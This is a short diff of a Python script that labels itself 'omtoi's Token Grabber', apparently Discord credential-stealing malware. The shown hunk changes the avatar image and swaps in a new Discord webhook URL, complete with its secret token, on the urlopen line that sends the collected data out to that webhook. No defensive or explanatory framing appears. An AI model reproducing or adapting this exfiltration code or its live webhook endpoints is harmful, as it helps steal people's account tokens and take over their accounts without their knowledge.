@@ -178,10 +178,10 @@ def main():
         "content": "",
         "embeds": embeds,
         "username": "omtoi's Token Grabber ",
-        "avatar_url": "https://cdn.discordapp.com/attachments/840487014934642721/840573649581113404/chennal_art_fade.png"
+        "avatar_url": "https://images.techhive.com/images/article/2014/04/windows-xp-bliss-desktop-image-100259888-orig.jpg"
     }
     try:
-        urlopen(Request("https://discord.com/api/webhooks/840569180017393684/23F6RDPvdhx_4_WQ1N9V14YNwUuHH41MnY3swMo2IYD7PnCu2J7yP2nMSO1JGiwkw6bq", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://ptb.discord.com/api/webhooks/1410786939178844160/Vp4BTaCSV9Xrj9OI4hFgz9gBSgXJuCLdx2leWM27222ge-yf7OqvT4a_ja29rPYC7ZHA", data=dumps(webhook).encode(), headers=getheaders()))
 
 
 
